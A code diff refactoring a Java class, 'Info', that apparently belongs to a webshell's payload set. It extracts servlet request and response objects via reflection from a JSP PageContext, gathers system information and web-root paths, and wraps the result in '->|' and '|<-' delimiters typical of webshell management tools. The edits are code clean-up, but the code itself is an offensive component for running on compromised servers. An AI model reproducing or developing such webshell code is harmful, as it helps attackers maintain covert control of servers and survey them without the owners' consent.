@@ -1,3 +1,5 @@
+package base;
+
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.File;
@@ -14,7 +16,7 @@ public class Info {
             Class clazz = Class.forName("javax.servlet.jsp.PageContext");
             request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
             response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
-        } catch (Exception ex) {
+        } catch (Exception e) {
             if (obj instanceof HttpServletRequest) {
                 request = (HttpServletRequest) obj;
                 try {
@@ -24,40 +26,30 @@ public class Info {
                     Field resp = request2.getClass().getDeclaredField("response");
                     resp.setAccessible(true);
                     response = (HttpServletResponse) resp.get(request2);
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
+                } catch (Exception ex) {
+                    try {
+                        response = (HttpServletResponse) request.getClass().getDeclaredMethod("getResponse").invoke(obj);
+                    } catch (Exception ignored) {
 
-            } else if (obj instanceof HttpServletResponse) {
-                response = (HttpServletResponse) obj;
-                try {
-                    Field resp = response.getClass().getDeclaredField("response");
-                    resp.setAccessible(true);
-                    HttpServletResponse response2 = (HttpServletResponse) resp.get(response);
-                    Field req = response2.getClass().getDeclaredField("request");
-                    req.setAccessible(true);
-                    request = (HttpServletRequest) req.get(response2);
-                } catch (Exception e) {
-                    e.printStackTrace();
+                    }
                 }
             }
         }
-        cs = request.getParameter("charset") != null ? request.getParameter("charset") : "UTF-8";
+        cs = "UTF-8";
         StringBuffer output = new StringBuffer("");
-        StringBuffer sb = new StringBuffer("");
         String tag_s = "->|";
         String tag_e = "|<-";
         try {
             response.setContentType("text/html");
             request.setCharacterEncoding(cs);
             response.setCharacterEncoding(cs);
-            output.append(tag_s);
-            sb.append(SysInfoCode(request));
-            output.append(sb.toString());
-            output.append(tag_e);
-            response.getWriter().print(output.toString());
+            output.append(SysInfoCode(request));
         } catch (Exception e) {
-            sb.append("ERROR" + ":// " + e.toString());
+            output.append("ERROR:// " + e.toString());
+        }
+        try {
+            response.getWriter().print(tag_s + output.toString() + tag_e);
+        } catch (Exception ignored) {
         }
         return true;
     }
@@ -83,15 +75,15 @@ public class Info {
     }
 
     String WwwRootPathCode(String d) {
-        String s = "";
-        if (!d.substring(0, 1).equals("/")) {
+        StringBuilder s = new StringBuilder();
+        if (!d.startsWith("/")) {
             File[] roots = File.listRoots();
-            for (int i = 0; i < roots.length; i++) {
-                s += roots[i].toString().substring(0, 2) + "";
+            for (File root : roots) {
+                s.append(root.toString(), 0, 2);
             }
         } else {
-            s += "/";
+            s.append("/");
         }
-        return s;
+        return s.toString();
     }
 }
